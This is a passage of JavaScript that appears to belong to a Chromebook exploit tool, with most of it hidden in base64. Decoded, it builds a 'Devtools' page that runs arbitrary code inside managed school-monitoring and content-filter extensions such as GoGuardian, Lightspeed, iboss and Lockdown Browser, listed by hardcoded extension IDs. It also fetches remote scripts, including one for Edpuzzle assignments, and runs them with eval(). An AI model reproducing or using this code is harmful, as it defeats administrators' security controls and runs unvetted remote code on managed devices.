c3M6ICovCiAgICAgICcuYWQnLCAnLmF2ZXJ0JywgJy5hdmVydF9fd3JhcHBlcicsICcubWlkZGxlLWJhbm5lci1hZCcsICcuYWR2ZXJ0aXNlbWVudCcsCiAgICAgICcuR29vZ2xlQWN0aXZlVmlld0NsYXNzJywgJy5hZHZlcnQnLCAnLmNucy1hZHMtc3RhZ2UnLCAnLnRlYWRzLWlucmVhZCcsICcuYWQtYmFubmVyJywKICAgICAgJy5hZC1hbmNob3JlZCcsICcuanNfc2hlbGZfYWRzJywgJy5hZC1zbG90JywgJy5hbnRlbm5hJywgJy54cmFpbC1jb250ZW50JywKICAgICAgJy5hZHZlcnRpc2VtZW50X19sZWFkZXJib2FyZCcsICcuYWQtbGVhZGVyYm9hcmQnLCAnLnRyY19yYm94X291dGVyJywgJy5rcy1yZWNvbW1lbmRlZCcsCiAgICAgICcuYXJ0aWNsZS1kYScsICdkaXYuc3BvbnNvcmVkLXN0b3JpZXMtY29tcG9uZW50JywgJ2Rpdi5hZGR0aGlzLXNtYXJ0bGF5ZXJzJywKICAgICAgJ2Rpdi5hcnRpY2xlLWFkc3BvbnNvcicsICdkaXYuc2lnbmluLXByb21wdCcsICdkaXYuYXJ0aWNsZS1idW1wZXInLCAnZGl2LnZpZGVvLXBsYWNlaG9sZGVyJywKICAgICAgJ2Rpdi50b3AtYWQtY29udGFpbmVyJywgJ2Rpdi5oZWFkZXItYWQnLCAnZGl2LmFkLXVuaXQnLCAnZGl2LmRlbW8tYmxvY2snLCAnZGl2Lk9VVEJSQUlOJywKICAgICAgJ2Rpdi5vYi13aWRnZXQnLCAnZGl2Lm53c3JtLXdyYXBwZXInLCAnZGl2LmFubm91bmNlbWVudEJhcicsICdkaXYucGFydG5lci1yZXNvdXJjZXMtYmxvY2snLAogICAgICAnZGl2LmFycm93LWRvd24nLCAnZGl2Lm0tYWQnLCAnZGl2LnN0b3J5LWludGVycnVwdCcsICdkaXYudGFib29sYS1yZWNvbW1lbmRlZCcsCiAgICAgICdkaXYuYWQtY2x1c3Rlci1jb250YWluZXInLCAnZGl2LmN0eC1zaWRlYmFyJywgJ2Rpdi5pbmNvZ25pdG8tbW9kYWwnLCAnLk9VVEJSQUlOJywgJy5zdWJzY3JpYmUtYnV0dG9uJywKICAgICAgJy5hZHM5JywgJy5sZWFkZXJib2FyZHMnLCAnLkdvb2dsZUFjdGl2ZVZpZXdFbGVtZW50JywgJy5tcHUtY29udGFpbmVyJywgJy5hZC0zMDB4NjAwJywgJy50Zi1hZC1ibG9jaycsCiAgICAgICcuc2lkZWJhci1hZHMtaG9sZGVyLXRvcCcsICcuYWRzLW9uZScsICcuRnVsbFBhZ2VNb2RhbF9fc2Nyb2xsZXInLAogICAgICAnLmNvbnRlbnQtYWRzLWhvbGRlcicsICcud2lkZ2V0LWFyZWEnLCAnLnNvY2lhbC1idXR0b25zJywgJy5hYy1wbGF5ZXItcGgnLAogICAgICAvKiBPdGhlcjogKi8KICAgICAgJ2FzaWRlI3Nwb25zb3JlZC1yZWNvbW1lbmRhdGlvbnMnLCAnYXNpZGVbcm9sZT0iYmFubmVyIl0nLCAnYXNpZGUnLAogICAgICAnYW1wLWFkJywgJ3NwYW5baWRePWFkX2lzX10nLCAnZGl2W2NsYXNzKj0iaW5kaWFuYXBvbGlzLW9wdGluIl0nLCAnZGl2W2lkXj1nb29nbGVfYWRzX2lmcmFtZV0nLAogICAgICAnZGl2W2RhdGEtZ29vZ2xlLXF1ZXJ5LWlkXScsICdzZWN0aW9uW2RhdGEtcmVzcG9uc2VdJywgJ2lucy5hZHNieWdvb2dsZScsICdkaXZbZGF0YS1nb29nbGUtcXVlcnktaWRdJywKICAgICAgJ2RpdltkYXRhLXRlc3QtaWQ9ImZ1bGxQYWdlU2lnbnVwTW9kYWwiXScsICdkaXZbZGF0YS10ZXN0LWlkPSJnaWZ0V3JhcCJdJyBdOwogICAgICBmb3IobGV0IGkgaW4gc2VsZWN0b3JzKSB7CiAgICAgICAgICBsZXQgbm9kZXNMaXN0ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbChzZWxlY3RvcnNbaV0pOwogICAgICAgICAgZm9yKGxldCBpID0gMDsgaSA8IG5vZGVzTGlzdC5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgIGxldCBlbCA9IG5vZGVzTGlzdFtpXTsKICAgICAgICAgICAgICBpZihlbCAmJiBlbC5wYXJlbnROb2RlKQogICAgICAgICAgICAgIGVsLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoZWwpOwogICAgICAgICAgfQogICAgICB9CiAgICB9KSgpOwogIGA7CgogICAgc2NyaXB0cy5lZHB1enpsZSA9IGAKICAgIGZldGNoKCJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvTWluZXI0OXVyL3Nob3J0aGFuZEBtYWluL2VkcHV6emxpbmdzY3JpcHQuanMiKS50aGVuKHIgPT4gci50ZXh0KCkpLnRoZW4ociA9PiB7CiAgICAgIGlmICghd2luZG93LmVkcHV6emxlc0xvYWRlZCkgewogICAgICAgIGV2YWwocik7CiAgICAgICAgd2luZG93LmVkcHV6emxlc0xvYWRlZCA9IHRydWU7CiAgICAgIH0KICAgIH0pOwogIGA7CiAgICBzY3JpcHRzLmludmlkaW91cyA9IGAKICAgIGZldGNoKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVDNNMU40TC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9zY3JpcHRzL2ludmlkaXJlY3QuanMiKS50aGVuKHIgPT4gci50ZXh0KCkpLnRoZW4ociA9PiB7CiAgICAgIGV2YWwocik7CiAgICB9KTsKICBgOwogICAgY29uZGl0aW9ucy5lZHB1enpsZSA9ICh0YWIpID0+IHRhYi51cmwubWF0Y2goL2VkcHV6emxlXC5jb21cL2Fzc2lnbm1lbnRzL2cpOwogICAgY29uZGl0aW9ucy5pbnZpZGlvdXMgPSAodGFiKSA9PgogICAgICB0YWIudXJsLm1hdGNoKC9eKD86aHR0cHM/OlwvXC8pKD86aW52fGludmlkaW91cylcLlteXC9dK1wvLip3YXRjaFw/dj0vKTsKCiAgICBjb25zdCBUb2dnbGVCdXR0b25zID0gVGFiQnV0dG9ucy5xdWVyeVNlbGVjdG9yKCIjdG9nZ2xlYWJsZS1idXR0b25zIik7CgogICAgVG9nZ2xlQnV0dG9ucy5xdWVyeVNlbGVjdG9yQWxsKCJidXR0b24iKS5mb3JFYWNoKAogICAgICAoYikgPT4KICAgICAgICAoYi5vbmNsaWNrID0gKCkgPT4gewogICAgICAgICAgY29uc3QgaWQgPSBiLmlkOwoKICAgICAgICAgIGlmIChiLmhhc0F0dHJpYnV0ZSgidG9nZ2xlZCIpKSB7CiAgICAgICAgICAgIC8vIHRvZ2dsZSBvZmYKICAgICAgICAgICAgaWYgKGlkIGluIGxpc3RlbmVycykKICAgICAgICAgICAgICBjaHJvbWUudGFicy5vblVwZGF0ZWQucmVtb3ZlTGlzdGVuZXIobGlzdGVuZXJzW2lkXSk7CiAgICAgICAgICAgIGIucmVtb3ZlQXR0cmlidXRlKCJ0b2dnbGVkIik7CiAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAvLyB0b2dnbGUgb24KICAgICAgICAgICAgY29uc3Qgc2NyaXB0ID0gc2NyaXB0c1tpZF0gfHwgIiI7CiAgICAgICAgICAgIGNvbnN0IGNvbmRpdGlvbiA9IGNvbmRpdGlvbnNbaWRdIHx8ICgodGFiKSA9PiB0cnVlKTsKICAgICAgICAgICAgY29uc3QgZnVuYyA9IGxpc3RlbmVyQXBwKCh0YWIpID0+IHsKICAgICAgICAgICAgICBpZiAoY29uZGl0aW9uKHRhYikpIHsKICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLmV4ZWN1dGVTY3JpcHQodGFiLmlkLCB7IGNvZGU6IHNjcmlwdCB9KTsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgbGlzdGVuZXJzW2lkXSA9IGZ1bmM7CgogICAgICAgICAgICBiLnNldEF0dHJpYnV0ZSgidG9nZ2xlZCIsICJ0cnVlIik7CiAgICAgICAgICB9CiAgICAgICAgfSkKICAgICk7CiAgfSBlbHNlIHsKICAgIFRhYkJ1dHRvbnMuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICB9CgogIGRvY3VtZW50CiAgICAucXVlcnlTZWxlY3RvcigiI2NvZGUtcnVuIikKICAgIC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHJ1bkNvZGUoZmFsc2UpKTsKfTsgLy8gRW5kIG9mIG9ubG9hZCBmdW5jdGlvbgoKY29uc3QgcnVuQ29kZSA9IGFzeW5jIChvblRhYiwgdGFiSWQgPSAiIikgPT4gewogIGNvbnN0IGNvZGVUZXh0YXJlYSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjb2RlIik7CiAgbGV0IGNvZGUgPSBjb2RlVGV4dGFyZWEudmFsdWU7CgogIGNvbnN0IG91dHB1dERpdiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjb2RlLW91dHB1dCIpOwoKICBpZiAob25UYWIpIHsKICAgIGNvZGUgPSBjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0CiAgICAgID8gYDtjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0KAogICAgICAgICAgJHt0YWJJZH0sCiAgICAgICAgICB7IGNvZGU6ICR7SlNPTi5zdHJpbmdpZnkoY29kZSl9IH0KICAgICAgICApYAogICAgICA6IGNocm9tZS5zY3JpcHRpbmcKICAgICAgPyBgY2hyb21lLnNjcmlwdGluZy5leGVjdXRlU2NyaXB0KHsKICAgICAgICAgIHRhcmdldDoge3RhYklkOiAke3RhYklkfX0sCiAgICAgICAgICBmdW5jOiAoKSA9PiB7JHtjb2RlfX0KICAgICAgICB9KTtgCiAgICAgIDogYGFsZXJ0KCJzb21ldGhpbmcgd2VudCB3cm9uZywgcnVuQ29kZSB3YXMgZXhlY3V0ZWQgb24gYSB0YWIgd2l0aG91dCBwcm9wZXIgcGVybWlzc2lvbnMiKWA7CiAgfQoKICB0cnkgewogICAgY29uc3Qgb3JpZ2luYWxMb2cgPSBjb25zb2xlLmxvZzsKICAgIGNvbnNvbGUubG9nID0gKC4uLmFyZ3MpID0+IHsKICAgICAgb3V0cHV0RGl2LmlubmVySFRNTCArPSBhcmdzLmpvaW4oIiAiKSArICI8YnI+IjsKICAgIH07CgogICAgY29uc3QgZnMgPSBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmdldEZTKCk7CiAgICBmdW5jdGlvbiB3cml0ZUZpbGUoZmlsZSwgZGF0YSkgewogICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gewogICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7IGNyZWF0ZTogdHJ1ZSB9LCBmdW5jdGlvbiAoZW50cnkpIHsKICAgICAgICAgIGVudHJ5LnJlbW92ZShmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7IGNyZWF0ZTogdHJ1ZSB9LCBmdW5jdGlvbiAoZW50cnkpIHsKICAgICAgICAgICAgICBlbnRyeS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24gKHdyaXRlcikgewogICAgICAgICAgICAgICAgd3JpdGVyLndyaXRlKG5ldyBCbG9iKFtkYXRhXSkpOwogICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXNvbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICAgIH0pOwogICAgfQoKICAgIGNvbnN0IHVybCA9IGF3YWl0IHdyaXRlRmlsZSgic3JjLmpzIiwgY29kZSk7CiAgICBsZXQgc2NyaXB0ID0KICAgICAgZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCIjZXZhbHVhdGVfZWxlbSIpID8/CiAgICAgIGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgc2NyaXB0LnJlbW92ZSgpOwogICAgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICBzY3JpcHQuaWQgPSAiZXZhbHVhdGVfZWxlbSI7CiAgICBzY3JpcHQuc3JjID0gdXJsOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOwoKICAgIGNvbnNvbGUubG9nID0gb3JpZ2luYWxMb2c7CiAgfSBjYXRjaCAoZXJyb3IpIHsKICAgIG91dHB1dERpdi5pbm5lckhUTUwgPSBgRXJyb3I6ICR7ZXJyb3J9YDsKICB9Cn07Cg==`))
                    const url = await writeFile('index.html', `${atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04IiAvPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiIC8+CiAgICA8dGl0bGU+VW50aXRsZWQgRG9jdW1lbnQ8L3RpdGxlPgogIDwvaGVhZD4KCiAgPGJvZHkgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6IGJsYWNrOyBjb2xvcjogd2hpdGU7IGZvbnQtZmFtaWx5OiBtb25zb3BhY2UiPgogICAgPGRpdiBjbGFzcz0ibWFpbiI+CiAgICAgIDxoMT5ObyBwYXlsb2FkcyBhcmUgYXZhaWxhYmxlPC9oMT4KICAgICAgPHA+CiAgICAgICAgTm8gcGF5bG9hZHMgY3VycmVudGx5IGF2YWlsYWJsZSBmb3IgeW91ciBleHRlbnNpb24uIFRyeSBhbm90aGVyCiAgICAgICAgZXh0ZW5zaW9uLiBXZSBhcmUgY3VycmVudGx5IGRldmVsb3BpbmcgcGF5bG9hZHMgZm9yIG90aGVyIEFQSXMuCiAgICAgIDwvcD4KICAgICAgPHA+QXZhaWxhYmxlIHBheWxvYWRzIGZvciBwZXJtaXNzaW9uczo8L3A+CiAgICAgIDx1bD4KICAgICAgICA8bGk+bWFuYWdlbWVudDwvbGk+CiAgICAgICAgPGxpPkRlZmF1bHQ8L2xpPgogICAgICA8L3VsPgogICAgPC9kaXY+CiAgPC9ib2R5Pgo8L2h0bWw+Cg==')}<script src="./index.js"></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);

            }
            document.open();
            document.write(atob(`PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCIgLz4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIiAvPgogICAgPHRpdGxlPkRldnRvb2xzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9Im1haW4iPgogICAgICAgIDxkaXYgY2xhc3M9ImhlYWRlciI+CiAgICAgICAgICAgIDxoMT5maWVyY2VzIG1hZ2ljIHJpZ2dpbmc8L2gxPgogICAgICAgIDwvZGl2PgogICAgICAgIDxwPgogICAgICAgICAgICBQcmVzcyBRIGZvciBldmFsdWF0aW5nIGNvZGUgdW5kZXIKICAgICAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaWQ9ImV4dGRiZyIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5leHRlbnNpb24gaWQ8L2E+CiAgICAgICAgPC9wPgogICAgICAgIDxwPk9yIHByZXNzIDEtOSBmb3Igc29tZSBoYXJkY29kZWQgZXh0ZW5zaW9uczwvcD4KICAgICAgICA8cD4KICAgICAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0iYWRrY3BrcGdoYWhtYm9wa2pjaG9iaWVja2VvYW9lZW0iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+bHMgZmlsdGVyPC9hPgogICAgICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJocGtkb2tha2pnbHBwZWVrZmVla21lYmZhaGFkbmZscCIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5scyBhbGVydDwvYT4KICAgICAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0iaGFsZGxnbGRwbGduZ2dramFhZmhlbGdpYWdsYWZhbmgiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+Z29ndWFyZGlhbjwvYT4KICAgICAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0ibW9laGtiYmNia2xta2NqaWJjYmJvb2ViZ3BvZ2Vqb2MiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+YXJpc3RvdGxlPC9hPgogICAgICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJrbWZmZWhiaWRsYWxpYmZla2xhZWZuY2twaWRib2RmZiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5pYm9zczwvYT4KICAgICAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0ibWxvYWpmbm1qY2tmamJlZW9mY2RhZWNiZWxuYmxkZW4iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+c25hcCZyZWFkPC9hPgogICAgICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJmb2dqZWFuamZiaW9tYmdobm1rbW1vcGhmZWNjamRraSIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5sb2NrZG93biBicm93c2VyPC9hPgogICAgICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJrbXBqbGlsbmVtamNpb2hqY2tqYWRtZ21pY29sZGdsZiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5keWtub3cgY2xvdWQ8L2E+CiAgICAgICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImduZG1oZGNlZmJobGNoa2hpcGNubmJrY21pY25jZWhrIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPkdGb3JtcyBMb2NrZWQgTW9kZSAob24gYWxsIGVucm9sbGVkIGNicyk8L2E+CiAgICAgICAgPC9wPgogICAgICAgIDxwPgogICAgICAgICAgICBQcmVzcyBNIGZvciBldmFsdWF0aW5nIHVuZGVyCiAgICAgICAgICAgIDxhIGNsYXNzPSJidXR0b24iIGlkPSJkZXZkYmciIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+ZGV2dG9vbHMgY29udGV4dDwvYT4KICAgICAgICA8L3A+CiAgICAgICAgPHA+VHlwaW5nIGNhbmNlbCBpbiBhbnkgcHJvbXB0IHdpbGwgY2FuY2VsIHRoZSBjdXJyZW50IG9wZXJhdGlvbi48L3A+CgogICAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImRldnRvb2xzOi8vZGV2dG9vbHMvYnVuZGxlZC9kZXZ0b29sc19hcHAuaHRtbD9leHBlcmltZW50cz10cnVlJndzPSUldXBkYXRlcnVybCUlIj5SZS1vcGVuIGRldnRvb2xzPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9InVwZGF0ZXIiPlVwZGF0ZSBwYXlsb2FkPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImNsZWFudXAiPkNsZWFudXAgYW5kIHJlc2V0IGZvciBleHRlbnNpb248L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0iYWN0aXZhdGUiPkNocm9tZSBVUkxzPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImFjdGl2YXRlMiI+Q2hyb21lIFVSTHMgMjwvYT4KICAgIDwvZGl2PgoKICAgIDxzdHlsZT4KICAgICAgICBpZnJhbWUgewogICAgICAgICAgICBvcGFjaXR5OiAwOwogICAgICAgICAgICB3aWR0aDogMDsKICAgICAgICAgICAgaGVpZ2h0OiAwOwogICAgICAgIH0KCiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBtb25vc3BhY2UsIHNhbnMtc2VyaWY7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMxZTFlMmU7CiAgICAgICAgICAgIGNvbG9yOiAjY2RkNmY0OwogICAgICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHg7CiAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgfQoKICAgICAgICBhIHsKICAgICAgICAgICAgY29sb3I6ICNiN2JkZjg7CiAgICAgICAgfQoKICAgICAgICAubWFpbiB7CiAgICAgICAgICAgIHRvcDogNTAlOwogICAgICAgICAgICBsZWZ0OiA1MCU7CiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7CiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkICMxODE4MjU7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgICAgICBwYWRkaW5nOiAyJTsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMxODE4MjU7CiAgICAgICAgICAgIG1heC13aWR0aDogOTB2dzsKICAgICAgICAgICAgbWF4LWhlaWdodDogOTB2aDsKICAgICAgICAgICAgb3ZlcmZsb3c6IGF1dG87IC8qIEFsbG93cyBzY3JvbGxpbmcgaWYgY29udGVudCBvdmVyZmxvd3MgKi8KICAgICAgICB9CgogICAgICAgIC5oZWFkZXIgewogICAgICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgICB9CgogICAgICAgIGgxIHsKICAgICAgICAgICAgZm9udC1zaXplOiAxLjRlbTsKICAgICAgICAgICAgbWFyZ2luOiAwOwogICAgICAgICAgICBjb2xvcjogI2NkZDZmNDsKICAgICAgICB9CgogICAgICAgIC5idXR0b24gewogICAgICAgICAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICM0NTQ3NWE7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICM1ODViNzA7CiAgICAgICAgICAgIGNvbG9yOiAjZjhmYWZjOwogICAgICAgICAgICBwYWRkaW5nOiA4cHggMTZweDsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgICAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsKICAgICAgICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICAgICAgICBtYXJnaW46IDZweCAwOwogICAgICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDhweDsKICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsKICAgICAgICAgICAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjNzIGVhc2UtaW4tb3V0LCBib3JkZXItY29sb3IgMC4zcyBlYXNlLWluLW91dCwgdHJhbnNmb3JtIDAuM3MgZWFzZS1pbi1vdXQ7CiAgICAgICAgfQoKICAgICAgICAuYnV0dG9uOjpiZWZvcmUsCiAgICAgICAgLmJ1dHRvbjo6YWZ0ZXIgewogICAgICAgICAgICBjb250ZW50OiAnJzsKICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOwogICAgICAgICAgICBoZWlnaHQ6IDEwMCU7CiAgICAgICAgICAgIHdpZHRoOiAwOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMTUpOwogICAgICAgICAgICB0cmFuc2l0aW9uOiB3aWR0aCAwLjRzIGVhc2UtaW4tb3V0OwogICAgICAgIH0KCiAgICAgICAgLmJ1dHRvbjo6YmVmb3JlIHsKICAgICAgICAgICAgbGVmdDogNTAlOwogICAgICAgIH0KCiAgICAgICAgLmJ1dHRvbjo6YWZ0ZXIgewogICAgICAgICAgICBsZWZ0OiAwOwogICAgICAgICAgICBib3JkZXI6IDJweCBzb2xpZCAjYjdiZGY4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA4cHg7CiAgICAgICAgICAgIG9wYWNpdHk6IDA7CiAgICAgICAgICAgIHRyYW5zaXRpb246IG9wYWNpdHkgMC4zcyBlYXNlLWluLW91dDsKICAgICAgICB9CgogICAgICAgIC5idXR0b246aG92ZXI6OmJlZm9yZSB7CiAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICBsZWZ0OiAwOwogICAgICAgIH0KCiAgICAgICAgLmJ1dHRvbjpob3Zlcjo6YWZ0ZXIgewogICAgICAgICAgICBvcGFjaXR5OiAxOwogICAgICAgIH0KCiAgICAgICAgLmJ1dHRvbjpob3ZlciB7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICM1ODViNzA7CiAgICAgICAgICAgIGJvcmRlci1jb2xvcjogIzdmODQ5YzsKICAgICAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjA1KTsKICAgICAgICB9CgogICAgICAgIC5oYXJkY29kZWQgewogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjM4YmE4OwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjZjI4ZmFkOwogICAgICAgICAgICBjb2xvcjogI2ZmZmZmZjsKICAgICAgICAgICAgcGFkZGluZzogOHB4IDE2cHg7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgICAgICAgbWFyZ2luOiA2cHggMDsKICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyOwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA4cHg7CiAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMC4zcyBlYXNlLWluLW91dCwgYm9yZGVyLWNvbG9yIDAuM3MgZWFzZS1pbi1vdXQsIHRyYW5zZm9ybSAwLjNzIGVhc2UtaW4tb3V0OwogICAgICAgIH0KCiAgICAgICAgLmhhcmRjb2RlZDo6YmVmb3JlLAogICAgICAgIC5oYXJkY29kZWQ6OmFmdGVyIHsKICAgICAgICAgICAgY29udGVudDogJyc7CiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgaGVpZ2h0OiAxMDAlOwogICAgICAgICAgICB3aWR0aDogMDsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjE1KTsKICAgICAgICAgICAgdHJhbnNpdGlvbjogd2lkdGggMC40cyBlYXNlLWluLW91dDsKICAgICAgICB9CgogICAgICAgIC5oYXJkY29kZWQ6OmJlZm9yZSB7CiAgICAgICAgICAgIGxlZnQ6IDUwJTsKICAgICAgICB9CgogICAgICAgIC5oYXJkY29kZWQ6OmFmdGVyIHsKICAgICAgICAgICAgbGVmdDogMDsKICAgICAgICAgICAgYm9yZGVyOiAycHggc29saWQgI2ZmY2FkNDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICAgICAgICBvcGFjaXR5OiAwOwogICAgICAgICAgICB0cmFuc2l0aW9uOiBvcGFjaXR5IDAuM3MgZWFzZS1pbi1vdXQ7CiAgICAgICAgfQoKICAgICAgICAuaGFyZGNvZGVkOmhvdmVyOjpiZWZvcmUgewogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgbGVmdDogMDsKICAgICAgICB9CgogICAgICAgIC5oYXJkY29kZWQ6aG92ZXI6OmFmdGVyIHsKICAgICAgICAgICAgb3BhY2l0eTogMTsKICAgICAgICB9CgogICAgICAgIC5oYXJkY29kZWQ6aG92ZXIgewogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjI4ZmFkOwogICAgICAgICAgICBib3JkZXItY29sb3I6ICNmZmNjZDU7CiAgICAgICAgICAgIHRyYW5zZm9ybTogc2NhbGUoMS4wNSk7CiAgICAgICAgfQoKICAgICAgICAjd2F0ZXJtYXJrIHsKICAgICAgICAgICAgcG9zaXRpb246IGZpeGVkOwogICAgICAgICAgICBmb250LWZhbWlseTogbW9ub3NwYWNlOwogICAgICAgICAgIC